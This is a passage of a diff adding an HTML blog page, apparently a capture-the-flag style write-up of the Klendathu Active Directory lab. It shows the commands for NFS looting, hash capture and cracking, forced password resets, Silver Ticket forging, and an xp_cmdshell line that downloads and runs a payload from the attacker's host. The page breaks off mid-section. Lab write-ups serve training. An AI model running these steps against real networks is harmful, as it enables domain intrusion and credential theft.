@@ -1,0 +1,552 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Klendathu — VulnLab Chain &#x2F; HTB Mini ProLab Writeup &amp; WalkthroughIntroductionWelcome to this writeup and walkthrough for Klendathu, a multi-machine Active Directory chain available on VulnLab">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VL-Klendathu">
+<meta property="og:url" content="https://panosoikogr.github.io/2026/03/14/VL-Klendathu/index.html">
+<meta property="og:site_name" content="Panosoiko Cybersecurity Blog">
+<meta property="og:description" content="Klendathu — VulnLab Chain &#x2F; HTB Mini ProLab Writeup &amp; WalkthroughIntroductionWelcome to this writeup and walkthrough for Klendathu, a multi-machine Active Directory chain available on VulnLab">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Klendathu/shares-open.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Klendathu/svc_backup.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Klendathu/force-change.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Klendathu/admin-mssql.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Klendathu/impersonate.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Klendathu/getting-system.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Klendathu/flag-user.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Klendathu/flag-linux.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Klendathu/hash-all.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Klendathu/flag-root.png">
+<meta property="article:published_time" content="2026-03-14T18:54:34.000Z">
+<meta property="article:modified_time" content="2026-03-14T18:57:19.699Z">
+<meta property="article:author" content="Panosoiko">
+<meta property="article:tag" content="Chain">
+<meta property="article:tag" content="Hack The Box">
+<meta property="article:tag" content="ProLab">
+<meta property="article:tag" content="VunlLab">
+<meta property="article:tag" content="Windows">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://panosoikogr.github.io/images/Klendathu/shares-open.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/android-chrome-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>VL-Klendathu</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-73BMC8ZHB7"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-73BMC8ZHB7');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2026/03/14/VL-Sidecar/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2026/03/14/VL-Klendathu/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2026/03/14/VL-Klendathu/&text=VL-Klendathu"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2026/03/14/VL-Klendathu/&title=VL-Klendathu"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2026/03/14/VL-Klendathu/&is_video=false&description=VL-Klendathu"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VL-Klendathu&body=Check out this article: https://panosoikogr.github.io/2026/03/14/VL-Klendathu/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2026/03/14/VL-Klendathu/&title=VL-Klendathu"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2026/03/14/VL-Klendathu/&title=VL-Klendathu"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2026/03/14/VL-Klendathu/&title=VL-Klendathu"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2026/03/14/VL-Klendathu/&title=VL-Klendathu"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2026/03/14/VL-Klendathu/&name=VL-Klendathu&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2026/03/14/VL-Klendathu/&t=VL-Klendathu"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Klendathu-%E2%80%94-VulnLab-Chain-HTB-Mini-ProLab-Writeup-Walkthrough"><span class="toc-number">1.</span> <span class="toc-text">Klendathu — VulnLab Chain &#x2F; HTB Mini ProLab Writeup &amp; Walkthrough</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Environment-Overview"><span class="toc-number">1.2.</span> <span class="toc-text">Environment Overview</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reconnaissance"><span class="toc-number">1.3.</span> <span class="toc-text">Reconnaissance</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Port-Scanning"><span class="toc-number">1.3.1.</span> <span class="toc-text">Port Scanning</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DC1-%E2%80%94-Domain-Controller"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">DC1 — Domain Controller</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SRV1-%E2%80%94-SQL-Server"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">SRV1 — SQL Server</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SRV2-%E2%80%94-Linux-Server"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">SRV2 — Linux Server</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Access-%E2%80%94-NFS-Share"><span class="toc-number">1.4.</span> <span class="toc-text">Initial Access — NFS Share</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration-with-Valid-Credentials"><span class="toc-number">1.5.</span> <span class="toc-text">Enumeration with Valid Credentials</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB-Shares"><span class="toc-number">1.5.1.</span> <span class="toc-text">SMB Shares</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LDAP-Signing"><span class="toc-number">1.5.2.</span> <span class="toc-text">LDAP Signing</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BloodHound-Collection"><span class="toc-number">1.5.3.</span> <span class="toc-text">BloodHound Collection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Coercion-Vulnerabilities"><span class="toc-number">1.5.4.</span> <span class="toc-text">Coercion Vulnerabilities</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSSQL-%E2%80%94-Hash-Capture-via-UNC-Path"><span class="toc-number">1.6.</span> <span class="toc-text">MSSQL — Hash Capture via UNC Path</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-%E2%80%94-ForceChangePassword"><span class="toc-number">1.7.</span> <span class="toc-text">Privilege Escalation — ForceChangePassword</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Silver-Ticket-Attack-%E2%80%94-MSSQL-Admin-Access"><span class="toc-number">1.8.</span> <span class="toc-text">Silver Ticket Attack — MSSQL Admin Access</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Code-Execution-on-SRV1"><span class="toc-number">1.9.</span> <span class="toc-text">Code Execution on SRV1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lateral-Movement-to-Linux-%E2%80%94-Kerberos-SSH"><span class="toc-number">1.10.</span> <span class="toc-text">Lateral Movement to Linux — Kerberos SSH</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Path-1-%E2%80%94-Machine-Account-Creation-Used"><span class="toc-number">1.10.1.</span> <span class="toc-text">Path 1 — Machine Account Creation (Used)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Path-2-%E2%80%94-UPN-Spoofing-Alternative"><span class="toc-number">1.10.2.</span> <span class="toc-text">Path 2 — UPN Spoofing (Alternative)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberos-Configuration"><span class="toc-number">1.10.3.</span> <span class="toc-text">Kerberos Configuration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Domain-Compromise-%E2%80%94-NTDS-Backup"><span class="toc-number">1.11.</span> <span class="toc-text">Domain Compromise — NTDS Backup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DPAPI-Decryption-%E2%80%94-RDG-File"><span class="toc-number">1.12.</span> <span class="toc-text">DPAPI Decryption — RDG File</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Domain-Administrator-Access"><span class="toc-number">1.13.</span> <span class="toc-text">Domain Administrator Access</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Summary"><span class="toc-number">1.14.</span> <span class="toc-text">Summary</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        VL-Klendathu
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Panosoiko</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2026-03-14T18:54:34.000Z" class="dt-published" itemprop="datePublished">2026-03-14</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Chain/" rel="tag">Chain</a>, <a class="p-category" href="/tags/Hack-The-Box/" rel="tag">Hack The Box</a>, <a class="p-category" href="/tags/ProLab/" rel="tag">ProLab</a>, <a class="p-category" href="/tags/VunlLab/" rel="tag">VunlLab</a>, <a class="p-category" href="/tags/Windows/" rel="tag">Windows</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Klendathu-—-VulnLab-Chain-HTB-Mini-ProLab-Writeup-Walkthrough"><a href="#Klendathu-—-VulnLab-Chain-HTB-Mini-ProLab-Writeup-Walkthrough" class="headerlink" title="Klendathu — VulnLab Chain &#x2F; HTB Mini ProLab Writeup &amp; Walkthrough"></a>Klendathu — VulnLab Chain &#x2F; HTB Mini ProLab Writeup &amp; Walkthrough</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Welcome to this writeup and walkthrough for <strong>Klendathu</strong>, a multi-machine Active Directory chain available on <strong>VulnLab (Chain)</strong> and <strong>Hack The Box (Mini ProLab)</strong>. This is a fantastic lab for anyone looking to sharpen their Active Directory penetration testing skills, covering a wide range of attack techniques from initial access through full domain compromise. Whether you stumbled upon this writeup while preparing for the lab or are following along after getting stuck, I hope it helps you understand the methodology behind each step. Let’s get into it.</p>
+<hr>
+<h2 id="Environment-Overview"><a href="#Environment-Overview" class="headerlink" title="Environment Overview"></a>Environment Overview</h2><p>The lab consists of three machines:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10.13.38.35  DC1.KLENDATHU.VL   — Domain Controller</span><br><span class="line">10.13.38.36  SRV1.KLENDATHU.VL  — Windows Server (MSSQL)</span><br><span class="line">10.13.38.37  SRV2.KLENDATHU.VL  — Linux Server (NFS)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><h3 id="Port-Scanning"><a href="#Port-Scanning" class="headerlink" title="Port Scanning"></a>Port Scanning</h3><h4 id="DC1-—-Domain-Controller"><a href="#DC1-—-Domain-Controller" class="headerlink" title="DC1 — Domain Controller"></a>DC1 — Domain Controller</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -Pn 10.13.38.35 -sC -sV -O -vvvv --max-retries 5 -p-</span><br></pre></td></tr></table></figure>
+
+<p>Standard domain controller ports are open: DNS (53), Kerberos (88), LDAP (389&#x2F;3268), SMB (445), RDP (3389), and WinRM (5985). The RDP banner confirms the domain name as <code>KLENDATHU.VL</code>.</p>
+<h4 id="SRV1-—-SQL-Server"><a href="#SRV1-—-SQL-Server" class="headerlink" title="SRV1 — SQL Server"></a>SRV1 — SQL Server</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">1433/tcp  open  ms-sql-s      Microsoft SQL Server 2022</span><br><span class="line">3389/tcp  open  ms-wbt-server</span><br><span class="line">5985/tcp  open  http</span><br></pre></td></tr></table></figure>
+
+<p>An MSSQL instance is running on port 1433. Notably, MSSQL also appears on port 1 — likely a scan artefact, so it can be ignored.</p>
+<h4 id="SRV2-—-Linux-Server"><a href="#SRV2-—-Linux-Server" class="headerlink" title="SRV2 — Linux Server"></a>SRV2 — Linux Server</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE</span><br><span class="line">22/tcp    open  ssh       OpenSSH 8.7</span><br><span class="line">111/tcp   open  rpcbind</span><br><span class="line">2049/tcp  open  nfs_acl</span><br><span class="line">20048/tcp open  mountd</span><br></pre></td></tr></table></figure>
+
+<p>An NFS share is exposed with no authentication required — this is our entry point.</p>
+<hr>
+<h2 id="Initial-Access-—-NFS-Share"><a href="#Initial-Access-—-NFS-Share" class="headerlink" title="Initial Access — NFS Share"></a>Initial Access — NFS Share</h2><p>Listing and mounting the open NFS share:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~/nfs_mount</span><br><span class="line">sudo mount -t nfs 10.13.38.37:/mnt/nfs_shares ~/nfs_mount</span><br><span class="line">ls ~/nfs_mount</span><br></pre></td></tr></table></figure>
+
+<p>The share contains a single file:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Switch344_running-config.cfg</span><br></pre></td></tr></table></figure>
+
+<p>Inspecting the config file reveals two things of interest:</p>
+<ol>
+<li>A <strong>Type 5 (MD5) password hash</strong>, which we crack with Hashcat:</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 500 hash3 /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p>The hash cracks to: <code>[REDACTED]</code></p>
+<ol start="2">
+<li><p>A <strong>cleartext password</strong> also stored in the config: <code>[REDACTED]</code></p>
+</li>
+<li><p>VTY line credentials (also cleartext): <code>[REDACTED]</code></p>
+</li>
+<li><p>A <strong>username</strong> in the config: <code>ZIM@KLENDATHU.VL</code></p>
+</li>
+</ol>
+<p>Testing the cracked credentials against the domain:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zim : [REDACTED]</span><br></pre></td></tr></table></figure>
+
+<p>Authentication succeeds.</p>
+<hr>
+<h2 id="Enumeration-with-Valid-Credentials"><a href="#Enumeration-with-Valid-Credentials" class="headerlink" title="Enumeration with Valid Credentials"></a>Enumeration with Valid Credentials</h2><h3 id="SMB-Shares"><a href="#SMB-Shares" class="headerlink" title="SMB Shares"></a>SMB Shares</h3><p>With valid credentials, we enumerate SMB shares on the domain controller. The <code>HomeDirs</code> share has <strong>READ&#x2F;WRITE</strong> access — note this for later.</p>
+<p><img src="/images/Klendathu/shares-open.png" alt="SMB Shares"></p>
+<h3 id="LDAP-Signing"><a href="#LDAP-Signing" class="headerlink" title="LDAP Signing"></a>LDAP Signing</h3><p>We check the LDAP signing configuration:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap 10.13.38.35 -u &#x27;zim&#x27; -p &#x27;[REDACTED]&#x27; -M maq</span><br></pre></td></tr></table></figure>
+
+<p>Key findings:</p>
+<ul>
+<li>LDAP signing is <strong>OFF</strong></li>
+<li>We can add up to <strong>10 machine accounts</strong> to the domain (default MAQ)</li>
+<li>ZIM can authenticate to the MSSQL instance on SRV1</li>
+</ul>
+<h3 id="BloodHound-Collection"><a href="#BloodHound-Collection" class="headerlink" title="BloodHound Collection"></a>BloodHound Collection</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap 10.13.38.35 -u &#x27;zim&#x27; -p &#x27;[REDACTED]&#x27; --bloodhound --dns-server 10.13.38.35 -c ALL --dns-tcp</span><br></pre></td></tr></table></figure>
+
+<p>Reviewing the BloodHound output reveals a service account named <code>svc_backup</code>, with the description:</p>
+<blockquote>
+<p><em>“Legacy account to sync data to users Home Directories”</em></p>
+</blockquote>
+<p>This account is also a member of the <strong>Linux SSH</strong> group — useful information for later.</p>
+<p><img src="/images/Klendathu/svc_backup.png" alt="svc_backup BloodHound"></p>
+<h3 id="Coercion-Vulnerabilities"><a href="#Coercion-Vulnerabilities" class="headerlink" title="Coercion Vulnerabilities"></a>Coercion Vulnerabilities</h3><p>Running a coercion check reveals several vulnerabilities:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">COERCE_PLUS 10.13.38.35  DC1   VULNERABLE, DFSCoerce</span><br><span class="line">COERCE_PLUS 10.13.38.36  SRV1  VULNERABLE, PetitPotam</span><br><span class="line">COERCE_PLUS 10.13.38.35  DC1   VULNERABLE, PetitPotam</span><br><span class="line">COERCE_PLUS 10.13.38.36  SRV1  VULNERABLE, MSEven</span><br><span class="line">COERCE_PLUS 10.13.38.35  DC1   VULNERABLE, MSEven</span><br></pre></td></tr></table></figure>
+
+<p>Note: SMB signing is <strong>ON</strong>, but LDAP signing is <strong>OFF</strong>, so NTLM relay to LDAP is viable.</p>
+<hr>
+<h2 id="MSSQL-—-Hash-Capture-via-UNC-Path"><a href="#MSSQL-—-Hash-Capture-via-UNC-Path" class="headerlink" title="MSSQL — Hash Capture via UNC Path"></a>MSSQL — Hash Capture via UNC Path</h2><p>Connecting to the MSSQL instance as ZIM:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mssqlclient.py KLENDATHU.VL/&#x27;zim&#x27;:&#x27;[REDACTED]&#x27;@10.13.38.36 -windows-auth</span><br></pre></td></tr></table></figure>
+
+<p>ZIM connects as a guest. There are no linked servers of note. However, we can abuse the <code>sys.dm_os_file_exists</code> function to force an outbound authentication to our listener:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM sys.dm_os_file_exists(&#x27;\\10.10.14.94\work\&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>With Responder running, we capture an NTLMv2 hash for the user <strong>RASCZAK</strong>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RASCZAK::[REDACTED HASH]</span><br></pre></td></tr></table></figure>
+
+<p>Cracking the hash:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RASCZAK : [REDACTED]</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Privilege-Escalation-—-ForceChangePassword"><a href="#Privilege-Escalation-—-ForceChangePassword" class="headerlink" title="Privilege Escalation — ForceChangePassword"></a>Privilege Escalation — ForceChangePassword</h2><p>Reviewing RASCZAK’s BloodHound privileges reveals <strong>ForceChangePassword</strong> over two domain users: <strong>RICO</strong> and <strong>IBANEZ</strong>.</p>
+<p><img src="/images/Klendathu/force-change.png" alt="ForceChangePassword"></p>
+<p>We reset their passwords:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD -d KLENDATHU.VL -u &#x27;RASCZAK&#x27; -p &#x27;[REDACTED]&#x27; --host 10.13.38.35 set password RICO &#x27;Password123!&#x27;</span><br><span class="line">bloodyAD -d KLENDATHU.VL -u &#x27;RASCZAK&#x27; -p &#x27;[REDACTED]&#x27; --host 10.13.38.35 set password IBANEZ &#x27;Password123!&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>Neither RICO nor IBANEZ have any significant privileges directly, but we already have what we need: we know the MSSQL service on SRV1 is running under the <strong>RASCZAK</strong> account.</p>
+<hr>
+<h2 id="Silver-Ticket-Attack-—-MSSQL-Admin-Access"><a href="#Silver-Ticket-Attack-—-MSSQL-Admin-Access" class="headerlink" title="Silver Ticket Attack — MSSQL Admin Access"></a>Silver Ticket Attack — MSSQL Admin Access</h2><p>Since we have RASCZAK’s NT hash (recovered via hash capture and cracking) and know the MSSQL service runs under his account, we can forge a <strong>Silver Ticket</strong> to impersonate the domain Administrator against the SQL service.</p>
+<p>First, get the domain SID:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap 10.13.38.35 -u &#x27;RICO&#x27; -p &#x27;Password123!&#x27; --get-sid</span><br></pre></td></tr></table></figure>
+
+<p>Forge the Silver Ticket:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ticketer.py -spn &#x27;MSSQL/SRV1.KLENDATHU.VL&#x27; -domain-sid [REDACTED] -domain KLENDATHU.VL -user-id 500 -nthash [REDACTED] administrator</span><br></pre></td></tr></table></figure>
+
+<p>Connect using the forged ticket:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mssqlclient.py -windows-auth -k -no-pass KLENDATHU.VL/administrator@SRV1.KLENDATHU.VL</span><br></pre></td></tr></table></figure>
+
+<p>We now have Administrator-level access to the MSSQL instance.</p>
+<p><img src="/images/Klendathu/admin-mssql.png" alt="MSSQL Admin"></p>
+<hr>
+<h2 id="Code-Execution-on-SRV1"><a href="#Code-Execution-on-SRV1" class="headerlink" title="Code Execution on SRV1"></a>Code Execution on SRV1</h2><p>With admin access to MSSQL, we enable <code>xp_cmdshell</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enable_xp_cmdshell</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Klendathu/impersonate.png" alt="Impersonation"></p>
+<p>We download and execute our payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshell curl http://10.10.14.94:8085/Word.exe -o C:\temp\Word.exe</span><br><span class="line">xp_cmdshell C:\temp\Word.exe</span><br></pre></td></tr></table></figure>
+
+<p>From there, privilege escalation to SYSTEM is straightforward.</p>
+<p><img src="/images/Klendathu/getting-system.png" alt="Getting SYSTEM"></p>
+<p>We dump the local SAM hive and recover credentials. <strong>Flag 1</strong> is captured here.</p>
+<p><img src="/images/Klendathu/flag-user.png" alt="Flag 1"></p>
+<hr>
+<h2 id="Lateral-Movement-to-Linux-—-Kerberos-SSH"><a href="#Lateral-Movement-to-Linux-—-Kerberos-SSH" class="headerlink" title="Lateral Movement to Linux — Kerberos SSH"></a>Lateral Movement to Linux — Kerberos SSH</h2><h3 id="Path-1-—-Machine-Account-Creation-Used"><a href="#Path-1-—-Machine-Account-Creation-Used" class="headerlink" title="Path 1 — Machine Account Creation (Used)"></a>Path 1 — Machine Account Creation (Used)</h3><p>Using RASCZAK’s credentials, we add a machine account to the domain and use it to authenticate to SRV2 via Kerberos SSH:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD --host DC1.KLENDATHU.VL -d KLENDATHU.VL -u &#x27;RASCZAK&#x27; -p &#x27;[REDACTED]&#x27; add computer &#x27;root&#x27; &#x27;HelloWorld123!&#x27;</span><br><span class="line">getTGT.py &#x27;KLENDATHU.VL&#x27;/&#x27;root&#x27;:&#x27;HelloWorld123!&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Path-2-—-UPN-Spoofing-Alternative"><a href="#Path-2-—-UPN-Spoofing-Alternative" class="headerlink" title="Path 2 — UPN Spoofing (Alternative)"></a>Path 2 — UPN Spoofing (Alternative)</h3><p>An alternative approach abuses the <code>userPrincipalName</code> attribute to impersonate another user:</p>
